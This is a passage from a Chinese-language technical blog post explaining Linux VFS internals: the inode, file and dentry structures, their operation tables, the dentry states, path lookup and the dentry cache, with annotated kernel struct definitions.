class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span>         <span class="comment">/* address space */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QUOTA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dquot</span>    *<span class="title">i_dquot</span>[<span class="title">MAXQUOTAS</span>];</span>    <span class="comment">/* 索引节点磁盘限额 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_devices</span>;</span>          <span class="comment">/* 用于具体的字符或块设备索引节点链表的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span>    <span class="comment">/* 如果文件是一个管道则使用它 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span>        <span class="comment">/* 指向块设备驱动程序的指针 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span>            <span class="comment">/* 指向字符设备驱动程序的指针 */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    __u32           i_generation;           <span class="comment">/* 索引节点版本号（由某些文件系统使用） */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FSNOTIFY</span></span><br><span class="line">    __u32           i_fsnotify_mask;        <span class="comment">/* all events this inode cares about */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_fsnotify_marks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_IMA</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_readcount; <span class="comment">/* struct files open RO */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">void</span>            *i_private; <span class="comment">/* fs or device private pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="i-state-成员"><a href="#i-state-成员" class="headerlink" title="i_state 成员"></a>i_state 成员</h3><ul>
<li>I_DIRTY_SYNC<br>  已被改变但不需要同步</li>
<li>I_DIRTY_DATASYNC<br>  数据部分已被改变</li>
<li>I_DIRTY_PAGES<br>  有脏的数据页</li>
<li>I_NEW<br>  索引节点对象已经分配，但还没有用从磁盘索引节点读取来的数据填充</li>
<li>I_WILL_FREE<br>  即将被释放</li>
<li>I_FREEING<br>  索引节点对象正在被释放</li>
<li>I_CLEAR<br>  索引节点对象的内容不再有意义</li>
<li>I_SYNC<br>  正在同步过程中</li>
<li>I_REFERENCED<br>  在LRU list中标记inode为最近被引用过</li>
<li>I_DIO_WAKEUP<br>  Never Set</li>
<li>I_DIRTY<br>  I_DIRTY_SYNC | I_DIRTY_DATASYNC | I_DIRTY_PAGES</li>
</ul>
<h3 id="inode-operations"><a href="#inode-operations" class="headerlink" title="inode_operations"></a>inode_operations</h3><p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * (*<span class="title">lookup</span>) (<span class="keyword">struct</span> <span class="title">inode</span> *,<span class="keyword">struct</span> <span class="title">dentry</span> *, <span class="title">unsigned</span> <span class="title">int</span>);</span></span><br><span class="line">    <span class="type">void</span> * (*follow_link) (<span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> nameidata *);</span><br><span class="line">    <span class="type">int</span> (*permission) (<span class="keyword">struct</span> inode *, <span class="type">int</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span> * (*<span class="title">get_acl</span>)(<span class="keyword">struct</span> <span class="title">inode</span> *, <span class="title">int</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*readlink) (<span class="keyword">struct</span> dentry *, <span class="type">char</span> __user *,<span class="type">int</span>);</span><br><span class="line">    <span class="type">void</span> (*put_link) (<span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> nameidata *, <span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*create) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *, <span class="type">umode_t</span>, <span class="type">bool</span>);</span><br><span class="line">    <span class="comment">/* 如果该inode描述一个目录文件，那么当在该目录下创建或打开一个文件时，内核必须为这个文件创建一个inode。VFS通过调用该inode的i_op-&gt;create()函数来完成上述新inode的创建。</span></span><br><span class="line"><span class="comment">    该函数的第一个参数为该目录的 inode，第二个参数为要打开新文件的dentry，第三个参数是对该文件的访问权限。如果该inode描述的是一个普通文件，那么该inode永远都不会调用这个create函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*link) (<span class="keyword">struct</span> dentry *,<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="comment">/* 用于在指定目录下创建一个硬链接。这个link函数最终会被系统调用link()调用。</span></span><br><span class="line"><span class="comment">    该函数的第一个参数是原始文件的dentry，第二个参数即为上述指定目录的inode，第三个参数是链接文件的dentry。 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*unlink) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="comment">/* 在某个目录下删除dentry指定的索引节点对象。这个unlink函数最终会被系统调用unlink()调用。 第一个参数即为上述硬链接所在目录的inode，第二个参数为要删除文件的dentry */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*symlink) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *,<span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 在某个目录下新建软连接（符号链接），第一个参数是原始文件所在目录的inode，第二个参数是原始文件的dentry，第三个参数是符号链接的名字（const char *） */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> (*mkdir) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *,<span class="type">umode_t</span>);</span><br><span class="line">    <span class="comment">/* 在指定的目录下创建一个子目录，当前目录的inode会调用i_op-&gt;mkdir()。该函数会被系统调用mkdir()调用。</span></span><br><span class="line"><span class="comment">    第一个参数即为指定目录的inode，第二个参数为子目录的dentry，第三个参数为子目录权限；</span></span><br><span class="line"><span class="comment">    （目录与子目录是通过目录inode中的dentry链相连的，而子目录的dentry又指向子目录自身的inode） */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*rmdir) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="type">int</span> (*mknod) (<span class="keyword">struct</span> inode *,<span class="keyword">struct</span> dentry *,<span class="type">umode_t</span>,<span class="type">dev_t</span>);</span><br><span class="line">    <span class="comment">/* 在指定的目录下创建一个特殊文件，比如管道、设备文件或套接字等 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*rename) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> inode *, <span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="type">int</span> (*setattr) (<span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> iattr *);</span><br><span class="line">    <span class="type">int</span> (*getattr) (<span class="keyword">struct</span> vfsmount *mnt, <span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> kstat *);</span><br><span class="line">    <span class="type">int</span> (*setxattr) (<span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="type">char</span> *,<span class="type">const</span> <span class="type">void</span> *,<span class="type">size_t</span>,<span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*getxattr) (<span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*listxattr) (<span class="keyword">struct</span> dentry *, <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">int</span> (*removexattr) (<span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">    <span class="type">int</span> (*fiemap)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> fiemap_extent_info *, u64 start,</span><br><span class="line">              u64 len);</span><br><span class="line">    <span class="type">int</span> (*update_time)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> timespec *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*<span class="type">atomic_open</span>)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> dentry *,</span><br><span class="line">               <span class="keyword">struct</span> file *, <span class="type">unsigned</span> open_flag,</span><br><span class="line">               <span class="type">umode_t</span> create_mode, <span class="type">int</span> *opened);</span><br><span class="line">&#125; ____cacheline_aligned;</span><br></pre></td></tr></table></figure>

<h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><ul>
<li>文件对象描述进程怎样与一个打开文件进行交互。</li>
<li>几个进程可以同时访问一个文件，因此文件指针必须放在文件对象而不是索引节点对象中</li>
</ul>
<p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>   <span class="title">fu_llist</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>     <span class="title">f_path</span>;</span>         <span class="comment">/* 文件对象通过f_path.dentry指针指向相关的目录项对象 */</span></span><br><span class="line">    <span class="comment">/* 目录项会指向相关的索引节点，索引节点会记录文件是否是脏的 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f_dentry    f_path.dentry</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>        *<span class="title">f_inode</span>;</span>   <span class="comment">/* cached value */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Protects f_ep_links, f_flags, f_pos vs i_size in lseek SEEK_CUR.</span></span><br><span class="line"><span class="comment">     * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span>      f_lock;</span><br><span class="line">    <span class="type">atomic_long_t</span>       f_count;    <span class="comment">/* 记录使用文件对象的进程数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        f_flags;</span><br><span class="line">    <span class="type">fmode_t</span>         f_mode;</span><br><span class="line">    <span class="type">loff_t</span>          f_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>  <span class="title">f_owner</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>   *<span class="title">f_cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>    <span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">    u64         f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">    <span class="type">void</span>            *private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">    <span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_ep_links</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_WRITECOUNT</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> f_mnt_write_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="file-operations"><a href="#file-operations" class="headerlink" title="file_operations"></a>file_operations</h3><p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span> <span class="comment">/* 用于指定拥有这个文件操作结构体的模块，通常取THIS_MODULE */</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="comment">/* 用于设置文件的偏移量。第一个参数指明要操作的文件，第二个参数为偏移量，第三个参数为开始偏移的位置（可取SEEK_SET,SEEK_CUR和SEEK_END之一）*/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 从文件中读数据。第一个参数为源文件，第二个参数为目的字符串，第三个参数指明欲读数据的总字节数，第四个参数指明从源文件的某个偏移量处开始读数据。由系统调用read()调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 往文件里写数据。第一个参数为目的文件，第二个参数源字符串，第三个参数指明欲写数据的总字节数，第四个参数指明从目的文件的某个偏移量出开始写数据。由系统调用write()调用 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">ssize_t</span> (*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 启动一个异步I/O操作，引入它是为了支持io_submit()系统调用 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="comment">/* 检查是否在一个文件上有操作发生，如果没有则睡眠，知道该文件上有操作发生 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="comment">/* 将指定文件映射到指定的地址空间上。由系统调用mmap()调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="comment">/* 打开指定文件，并且将这个文件和指定的索引结点关联起来。由系统调用open()调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="comment">/* 释放以打开的文件，当打开文件的引用计数（f_count）为0时，该函数被调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="comment">/* 文件在缓冲的数据写回磁盘 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset, <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">int</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Dentry"><a href="#Dentry" class="headerlink" title="Dentry"></a>Dentry</h2><p>VFS把每一个目录看作由若干个目录和文件组成的一个普通文件。</p>
<p>*** 本来inode中应该包括“目录节点”的名称，但由于硬链接的存在，导致一个物理文件可能有多个文件名，因此把和“目录节点”名称相关的部分从 inode 中分开，放在一个专门的 dentry 结构（目录项）中 ***<br>描述一个文件和一个名字的对应关系，或者说dentry就是一个“文件名”</p>
<p><img src="/images/vfs/dentry_1.jpg" alt="dentry_1.jpg"></p>
<ul>
<li>在内存中, 每个文件都至少有一个dentry(目录项)和inode(索引节点)结构</li>
<li>dentry记录着文件名，上级目录等信息，正是它形成了我们所看到的树状结构</li>
<li>有关该文件的组织和管理的信息主要存放inode里面，它记录着文件在存储介质上的位置与分布</li>
</ul>
<p><img src="/images/vfs/dentry_2.png" alt="dentry_2.png"></p>
<p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">    <span class="comment">/* RCU lookup touched fields */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> d_flags;       <span class="comment">/* protected by d_lock */</span></span><br><span class="line">    <span class="type">seqcount_t</span> d_seq;       <span class="comment">/* per dentry seqlock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_hash</span>;</span>    <span class="comment">/* lookup hash list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>    <span class="comment">/* parent directory */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>      <span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment">                     * negative */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> d_iname[DNAME_INLINE_LEN];    <span class="comment">/* small names */</span></span><br><span class="line">                  </span><br><span class="line">    <span class="comment">/* Ref lookup also touches following */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> d_count;       <span class="comment">/* protected by d_lock */</span></span><br><span class="line">                  </span><br><span class="line">    <span class="type">spinlock_t</span> d_lock;      <span class="comment">/* per dentry lock */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>   <span class="comment">/* The root of the dentry tree */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> d_time;       <span class="comment">/* used by d_revalidate */</span></span><br><span class="line">    <span class="type">void</span> *d_fsdata;         <span class="comment">/* fs-specific data */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>     <span class="comment">/* LRU list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>   <span class="comment">/* child of parent list */</span></span><br><span class="line">    <span class="comment">/* 如果当前目录项是一个目录，那么该目录项通过这个字段加入到父目录的d_subdirs链表当中。这个字段中的next和prev指针分别指向父目录中的另外两个子目录 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span> <span class="comment">/* our children */</span></span><br><span class="line">    <span class="comment">/* 如果当前目录项是一个目录，那么该目录下所有的子目录（一级子目录）形成一个链表。该字段是这个链表的表头 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * d_alias and d_rcu can share memory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_alias</span>;</span>  <span class="comment">/* inode alias list */</span></span><br><span class="line">        <span class="comment">/* 索引节点中的i_dentry指向了它目录项，目录项中的d_alias，d_inode又指会了索引节点对象</span></span><br><span class="line"><span class="comment">        一个inode可能对应多个目录项，所有的目录项形成一个链表。inode结构中的i_dentry即为这个链表的头结点。当前目录项以这个字段处于i_dentry链表中。该字段中的prev和next指针分别指向与该目录项同inode的其他两个（如果有的话）目录项 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">    &#125; d_u;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="dentry的四种状态"><a href="#dentry的四种状态" class="headerlink" title="dentry的四种状态"></a>dentry的四种状态</h3><ul>
<li>空闲状态（Free）<br>  该状态的目录对象不包括有效的信息，没有被vfs使用。</li>
<li>未使用状态（unused）<br>  该状态的目录对象还没有被内核使用。引用计数器<code>d_count</code>为0，<code>d_inode</code>字段仍然指向关联的索引节点，目录对象包含有效的信息。为了在必要时回收内存，它的内容可能被丢弃。</li>
<li>正在使用状态（in use）<br>  该状态的目录对象正在被内核使用。引用计数器<code>d_count</code>大于0，<code>d_inode</code>字段指向关联的索引节点，目录对象包含有效的信息，不能被丢弃。</li>
<li>负状态（negative）<br>  与目录对象关联的索引节点不存在，相应的磁盘索引节点已被删除。<code>d_inode</code>被置为NULL，该对象仍被保存在目录项高速缓存中，以便同一文件目录名的查找能够快速完成。</li>
</ul>
<h3 id="dentry-oprations"><a href="#dentry-oprations" class="headerlink" title="dentry_oprations"></a>dentry_oprations</h3><p><code>include/linux/dcache.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*d_revalidate)(<span class="keyword">struct</span> dentry *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="comment">/* 该函数判断目录对象是否有效。VFS准备从dcache中使用一个目录项时，会调用该函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*d_weak_revalidate)(<span class="keyword">struct</span> dentry *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*d_hash)(<span class="type">const</span> <span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="keyword">struct</span> inode *, <span class="keyword">struct</span> qstr *);</span><br><span class="line">    <span class="comment">/* 该目录生成散列值，当目录项要加入到散列表时，VFS要调用此函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*d_compare)(<span class="type">const</span> <span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="keyword">struct</span> inode *, <span class="type">const</span> <span class="keyword">struct</span> dentry *, <span class="type">const</span> <span class="keyword">struct</span> inode *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="keyword">struct</span> qstr *);</span><br><span class="line">    <span class="type">int</span> (*d_delete)(<span class="type">const</span> <span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="comment">/* 当d_count=0时，VFS调用次函数。使用该函数要加dcache_lock锁 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*d_release)(<span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="comment">/* 当该目录对象将要被释放时，VFS调用该函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*d_prune)(<span class="keyword">struct</span> dentry *);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*d_iput)(<span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> inode *);</span><br><span class="line">    <span class="comment">/* 当一个目录项丢失了其索引节点时，VFS就掉用该函数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *(*d_dname)(<span class="keyword">struct</span> dentry *, <span class="type">char</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *(*<span class="title">d_automount</span>)(<span class="keyword">struct</span> <span class="title">path</span> *);</span></span><br><span class="line">    <span class="type">int</span> (*d_manage)(<span class="keyword">struct</span> dentry *, <span class="type">bool</span>);</span><br><span class="line">&#125; ____cacheline_aligned;</span><br></pre></td></tr></table></figure>

<h3 id="Dentry定位文件"><a href="#Dentry定位文件" class="headerlink" title="Dentry定位文件"></a>Dentry定位文件</h3><p>首先，通过dir对应的dentry0找到inode0节点，有了inode节点就可以读取目录中的信息。其中包含了该目录包含的下一级目录与文件文件列表，包括name与inode号。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> <span class="built_in">ls</span> -i</span></span><br><span class="line">975248 subdir0  975247 subdir1   975251 file0</span><br></pre></td></tr></table></figure>

<p>然后，根据通过根据subdir0对应的inode号重建inode2，并通过文件数据（目录也是文件）与inode2重建subdir0的dentry节点：dentry1。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> <span class="built_in">ls</span> -i</span></span><br><span class="line">975311 file1 975312 file2</span><br></pre></td></tr></table></figure>

<p>接着，根据file1对应的inode号重建inode4，并通过文件数据与inode4重建file1的dentry节点。最后，就可以通过inode4节点访问文件了。</p>
<p><img src="/images/vfs/dentry_3.png" alt="dentry_3.png"></p>
<h3 id="Dentry-Cache"><a href="#Dentry-Cache" class="headerlink" title="Dentry Cache"></a>Dentry Cache</h3><p>由于从硬盘读入一个目录项并构造相应的目录项对象需要花费大量的时间，也为了最大限度提高目处理这些录项对象的效率，VFS采用了dentry cache的设计。当有用户用ls命令查看某一个目录或用open命令打开一个文件时，VFS会为这里用的每个目录项与文件建立dentry项与inode，即“按需创建”。然后维护一个LRU（Least Recently Used）列表，当Linux认为VFS占用太多资源时，VFS会释放掉长时间没有被使用的dentry项与inode项。</p>
